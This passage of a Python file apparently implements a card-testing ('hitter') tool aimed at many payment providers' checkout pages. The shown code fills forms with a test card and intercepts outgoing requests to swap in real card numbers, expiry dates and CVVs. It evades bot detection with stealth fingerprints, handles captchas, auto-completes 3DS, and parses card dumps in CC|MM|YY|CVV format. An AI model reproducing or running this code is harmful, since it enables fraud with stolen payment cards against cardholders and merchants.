        'input[data-braintree-name="cardholder_name"]', '#cardholder-name',
        'input[name="credit_card[cardholder_name]"]', 'input[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("braintreegateway.com" in request.url or "braintree" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY, f"{self.real_card['month']}/{self.real_card['year']}")
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'credit_card\[number\]=4242424242424242', f'credit_card[number]={self.real_card["card"]}', post_data)
                    post_data = re.sub(r'credit_card\[expiration_date\]=01/30', f'credit_card[expiration_date]={self.real_card["month"]}/{self.real_card["year"]}', post_data)
                    post_data = re.sub(r'credit_card\[cvv\]=123', f'credit_card[cvv]={self.real_card["cvv"]}', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= ADYEN AUTOFILL =============
class AdyenAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', 'input[name="cardNumber"]', '[data-cse="number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
        '.card-number-input'
    ]
    EXPIRY_SELECTORS = [
        '#expiryDate', 'input[name="expiryDate"]', '[data-cse="expiryMonth"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]',
        '.expiry-date-input'
    ]
    CVC_SELECTORS = [
        '#cvc', 'input[name="cvc"]', '[data-cse="cvc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
        '.cvc-input'
    ]
    NAME_SELECTORS = [
        '#cardholderName', 'input[name="cardholderName"]', '[data-cse="holderName"]',
        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.adyen-checkout__button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("adyen.com" in request.url or "checkoutshopper" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'"number":"4242424242424242"', f'"number":"{self.real_card["card"]}"', post_data)
                    post_data = re.sub(r'"expiryMonth":"01"', f'"expiryMonth":"{self.real_card["month"]}"', post_data)
                    post_data = re.sub(r'"expiryYear":"30"', f'"expiryYear":"{self.real_card["year"]}"', post_data)
                    post_data = re.sub(r'"cvc":"123"', f'"cvc":"{self.real_card["cvv"]}"', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= SQUARE AUTOFILL =============
class SquareAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="card_number"]', '#card-number', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
        '.sq-card-number'
    ]
    EXPIRY_SELECTORS = [
        'input[name="expiration_date"]', '#expiration-date', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiration date"]',
        '.sq-expiration-date'
    ]
    CVC_SELECTORS = [
        'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
        '.sq-cvv'
    ]
    NAME_SELECTORS = [
        'input[name="cardholder_name"]', '#cardholder-name', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("squareup.com" in request.url or "square" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'card_number=4242424242424242', f'card_number={self.real_card["card"]}', post_data)
                    post_data = re.sub(r'expiration_date=01%2F30', f'expiration_date={self.real_card["month"]}%2F{self.real_card["year"]}', post_data)
                    post_data = re.sub(r'cvv=123', f'cvv={self.real_card["cvv"]}', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= MOLLIE AUTOFILL =============
class MollieAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="cardNumber"]', '#cardNumber', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
        '.card-number'
    ]
    EXPIRY_SELECTORS = [
        'input[name="expiryDate"]', '#expiryDate', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]',
        '.expiry-date'
    ]
    CVC_SELECTORS = [
        'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
        '.cvc'
    ]
    NAME_SELECTORS = [
        'input[name="cardholderName"]', '#cardholderName', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("mollie.com" in request.url or "api.mollie.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= KLARNA AUTOFILL =============
class KlarnaAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="cardNumber"]', '#cardNumber', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        'input[name="expiryDate"]', '#expiryDate', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]'
    ]
    CVC_SELECTORS = [
        'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]'
    ]
    NAME_SELECTORS = [
        'input[name="cardholderName"]', '#cardholderName', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("klarna.com" in request.url or "api.klarna.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= AUTHORIZE.NET AUTOFILL =============
class AuthorizeNetAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="x_card_num"]', '#cardNumber', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        'input[name="x_exp_date"]', '#expiryDate', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]'
    ]
    CVC_SELECTORS = [
        'input[name="x_card_code"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]'
    ]
    NAME_SELECTORS = [
        'input[name="x_card_name"]', '#cardholderName', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("authorize.net" in request.url or "authorizenet" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= WOOCOMMERCE AUTOFILL =============
class WooCommerceAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#wc-stripe-card-number', '#wc-braintree-card-number', '#wc-paypal-card-number',
        'input[name="cardnumber"]', 'input[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        '#wc-stripe-expiry', '#wc-braintree-expiry', 'input[name="expirydate"]',
        'input[autocomplete="cc-exp"]', 'input[placeholder*="MM/YY"]'
    ]
    CVC_SELECTORS = [
        '#wc-stripe-cvc', '#wc-braintree-cvc', 'input[name="cvc"]',
        'input[autocomplete="cc-csc"]', 'input[placeholder*="CVC"]'
    ]
    NAME_SELECTORS = [
        'input[name="cardholder_name"]', 'input[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        '#billing_email', 'input[name="billing_email"]', 'input[type="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '#place_order', '.place-order-button',
        'button:has-text("Place order")', 'button:has-text("Pay")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("woocommerce" in request.url or "wc-api" in request.url or "stripe.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= BIGCOMMERCE AUTOFILL =============
class BigCommerceAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#card-number', 'input[name="card_number"]', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        '#expiry-date', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]'
    ]
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]'
    ]
    NAME_SELECTORS = [
        '#cardholder-name', 'input[name="cardholder_name"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '#pay-button', '.pay-button',
        'button:has-text("Pay")', 'button:has-text("Place order")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("bigcommerce.com" in request.url or "bigcommerce" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= WIX AUTOFILL =============
class WixAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        '#expiryDate', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]'
    ]
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]'
    ]
    NAME_SELECTORS = [
        '#cardholderName', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '#pay-button',
        'button:has-text("Pay")', 'button:has-text("Place order")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("wix.com" in request.url or "wix" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= ECWID AUTOFILL =============
class EcwidAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        '#expiryDate', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]'
    ]
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]'
    ]
    NAME_SELECTORS = [
        '#cardholderName', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '#pay-button',
        'button:has-text("Pay")', 'button:has-text("Place order")'
    ]
    MASKED_CARD = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

        async def intercept_route(route, request):
            if request.method == "POST" and ("ecwid.com" in request.url or "ecwid" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()

        await self.page.route("**/*", intercept_route)


# ============= AUTOFILL MAP =============
AUTOFILL_MAP = {
    'stripe': StripeAutofill,
    'checkoutcom': CheckoutComAutofill,
    'shopify': ShopifyAutofill,
    'paypal': PayPalAutofill,
    'braintree': BraintreeAutofill,
    'adyen': AdyenAutofill,
    'square': SquareAutofill,
    'mollie': MollieAutofill,
    'klarna': KlarnaAutofill,
    'authorizenet': AuthorizeNetAutofill,
    'woocommerce': WooCommerceAutofill,
    'bigcommerce': BigCommerceAutofill,
    'wix': WixAutofill,
    'ecwid': EcwidAutofill,
}

SUPPORTED_PROVIDERS = list(AUTOFILL_MAP.keys())


# ============= HITTER ENGINE =============
async def hit_single(url: str, card: Dict, attempt_num: int) -> Dict:
    """Hit a single card against a URL. Returns result dict."""
    start_time = time.time()
    result = {
        'attempt': attempt_num, 'card': card, 'success': False,
        'decline_code': None, 'receipt_url': None,
        'response_time': 0, 'error': None, 'provider': 'unknown',
    }

    try:
        from playwright.async_api import async_playwright
    except ImportError:
        result['error'] = 'Playwright not installed'
        return result

    try:
        async with async_playwright() as p:
            fingerprint = FingerprintGenerator.generate()

            browser = await p.chromium.launch(
                headless=True,
                args=['--disable-blink-features=AutomationControlled', '--no-sandbox']
            )

            context = await browser.new_context(
                user_agent=fingerprint['user_agent'],
                viewport=fingerprint['viewport'],
                locale=fingerprint['locale'],
                timezone_id=fingerprint['timezone_id'],
                ignore_https_errors=True,
            )
            page = await context.new_page()

            await page.add_init_script(FingerprintGenerator.get_stealth_script())
            await page.goto(url, timeout=60000, wait_until='domcontentloaded')
            await asyncio.sleep(3)

            provider = detect_provider(url, await page.content())
            result['provider'] = provider

            autofill_class = AUTOFILL_MAP.get(provider)
            if not autofill_class:
                result['error'] = f'Unsupported provider: {provider}'
                await browser.close()
                return result

            autofill = autofill_class(page)
            await autofill.handle_captcha()
            await autofill.enable_card_replace(card)
            await autofill.fill_card(card)

            submitted = await autofill.submit()
            if not submitted:
                result['error'] = 'Submit button not found'
                await browser.close()
                return result

            await asyncio.sleep(5)

            if await autofill.wait_for_3ds(10000):
                await autofill.auto_complete_3ds()
                await asyncio.sleep(5)

            await autofill.handle_captcha()

            current_url = page.url
            result['response_time'] = time.time() - start_time

            if any(k in current_url.lower() for k in ['receipt', 'thank_you', 'success', 'order_confirmation', 'complete', 'thank-you', 'order-confirmation']):
                result['success'] = True
                result['receipt_url'] = current_url
            else:
                error_text = await page.text_content('body')
                if 'declined' in error_text.lower():
                    result['decline_code'] = 'card_declined'
                else:
                    result['decline_code'] = 'unknown'

            await browser.close()

    except Exception as e:
        result['error'] = str(e)[:120]
        result['decline_code'] = 'exception'

    result['response_time'] = time.time() - start_time
    return result


def parse_card_line(line: str) -> Optional[Dict]:
    """Parse CC|MM|YY|CVV into a card dict."""
    parts = line.strip().split('|')
    if len(parts) != 4:
        return None
    return {
        'card': parts[0].strip(),
        'month': parts[1].strip().zfill(2),
        'year': parts[2].strip().zfill(2),
        'cvv': parts[3].strip(),
        'brand': CardGenerator.get_card_brand(parts[0].strip()),
    }
